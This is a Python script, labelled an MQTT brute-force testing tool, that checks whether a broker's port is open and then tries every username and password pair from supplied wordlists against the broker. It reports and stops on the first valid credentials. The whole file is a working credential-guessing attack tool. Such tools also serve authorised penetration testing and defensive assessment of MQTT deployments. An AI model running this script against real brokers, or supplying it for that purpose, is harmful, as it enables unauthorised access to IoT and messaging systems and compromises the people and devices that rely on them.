import paho.mqtt.client as mqtt
import argparse
import time
import socket

# Function to check if MQTT port is open
def is_port_open(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)  # Timeout to avoid long waits
    try:
        sock.connect((host, port))
        sock.close()
        print(f"[+] Port {port} is open on {host}. Proceeding with brute force attack...")
        return True
    except (socket.timeout, socket.error):
        print(f"[-] Port {port} is closed on {host}. Exiting.")
        return False

# Callback function to check connection status
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] SUCCESS: Username: {userdata['username']} | Password: {userdata['password']}")
        userdata["authenticated"] = True
    else:
        print(f"[-] FAILED: Username: {userdata['username']} | Password: {userdata['password']}")
        userdata["authenticated"] = False
    client.disconnect()  # Disconnect immediately after the attempt

# Function to attempt MQTT connection with proper validation
def attempt_mqtt_connection(broker, port, username, password):
    client = mqtt.Client()
    client.username_pw_set(username, password)

    # Userdata to track authentication success
    client.user_data_set({"username": username, "password": password, "authenticated": False})
    client.on_connect = on_connect  # Assign the callback function

    try:
        client.connect(broker, port, 5)  # 5-second timeout
        client.loop_start()  # Start network loop
        time.sleep(2)  # Allow time for connection to process
        client.loop_stop()  # Stop the loop
        return client._userdata["authenticated"]
    except Exception:
        print(f"[-] ERROR: Unable to connect to {broker}:{port} with {username}/{password}")
        return False

# Brute force function
def brute_force_mqtt(broker, port, userlist, passlist):
    with open(userlist, 'r') as ufile, open(passlist, 'r') as pfile:
        usernames = [line.strip() for line in ufile]
        passwords = [line.strip() for line in pfile]

    for username in usernames:
        for password in passwords:
            if attempt_mqtt_connection(broker, port, username, password):
                print("[!] Valid credentials found, stopping attack.")
                return
            time.sleep(0.5)  # Delay to avoid excessive connection attempts

# Command-line argument parsing
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MQTT Brute Force Testing Tool")
    parser.add_argument("-b", "--broker", required=True, help="MQTT broker IP address")
    parser.add_argument("-p", "--port", type=int, default=1883, help="MQTT broker port (default: 1883)")
    parser.add_argument("-U", "--userlist", required=True, help="Path to username wordlist")
    parser.add_argument("-P", "--passlist", required=True, help="Path to password wordlist")

    args = parser.parse_args()

    # Check if the port is open before proceeding
    if is_port_open(args.broker, args.port):
        print(f"[*] Starting MQTT brute force on {args.broker}:{args.port}")
        brute_force_mqtt(args.broker, args.port, args.userlist, args.passlist)
    else:
        print("[!] Exiting the script.")
